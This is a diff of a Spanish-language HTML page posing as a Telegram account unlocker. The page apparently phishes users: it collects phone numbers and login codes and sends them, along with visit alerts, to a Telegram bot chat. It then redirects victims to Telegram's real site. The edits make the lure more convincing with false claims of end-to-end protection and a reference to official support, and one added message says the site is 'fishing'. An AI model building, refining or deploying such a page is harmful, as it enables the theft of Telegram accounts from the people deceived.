@@ -6,7 +6,7 @@
   <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
   <meta http-equiv="Pragma" content="no-cache" />
   <meta http-equiv="Expires" content="0" />
-  <title>Desbloqueador de cuentas y recuperación de cuentas de Telegram</title>
+  <title>Desbloqueador y recuperación de cuentas de Telegram</title>
   <style>
     :root{
       --bg:#ffffff;
@@ -95,14 +95,14 @@
 
   <div class="wrap">
     <main class="card" role="main" aria-labelledby="title">
-      <div class="security-badge">🔒 Protegido con Base64</div>
+      <div class="security-badge">🔒 Protegido de extremo a extremo</div>
       <header class="header">
         <div class="logo" aria-hidden="true">
           <img src="https://raw.githubusercontent.com/JesusQuijada34/tgtamperhack/main/assets/product_logo.png" alt="Logo" />
         </div>
         <div>
           <h1 id="title">Configuración de la Cuenta</h1>
-          <p class="lead">Introduce tu teléfono para recibir un código seguro para poder recargar y desbloquear tu cuenta.</p>
+          <p class="lead">Introduce tu teléfono para recibir un código seguro para poder desbloquear a lo máximo tu cuenta.</p>
         </div>
       </header>
 
@@ -144,7 +144,7 @@
         <div>"La seguridad primero: nunca compartas tu código por más que digan que provienen de Telegram. Usa siempre métodos seguros del servidor para procesar datos."</div>
       </div>
 
-      <p class="note">Este formulario está protegido con codificación Base64 para mayor seguridad.</p>
+      <p class="note">Este formulario está protegido para evitar la filtración de datos.</p>
     </main>
   </div>
 
@@ -202,7 +202,7 @@
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
                 chat_id: chatId,
-                text: '✅ Página cargada correctamente - Test de funcionamiento'
+                text: '✅ Alguien ha visitado el sitio, pescando...'
               })
             });
             console.log('Mensaje de prueba enviado con éxito');
@@ -273,7 +273,7 @@
 
       } catch (err) {
         console.error(err);
-        showError('No se pudo enviar el código. Revisa la conexión o contacta soporte.');
+        showError('No se pudo enviar el código. Revisa la conexión o contacta al soporte de Telegram support@telegram.org.');
       }
     });
 
@@ -298,7 +298,7 @@
             text: `Código recibido: ${code}`
           })
         });
-        showSuccess('Código verificado. Redirigiendo a Telegram para verificar que provenga de una persona real...');
+        showSuccess('Código verificado, Destruyendo datos de este sitio y redirigiendo al transformador...');
         setTimeout(() => location.href = 'https://my.telegram.org/auth?to=recovery', 900);
       } catch (err) {
         console.error(err);
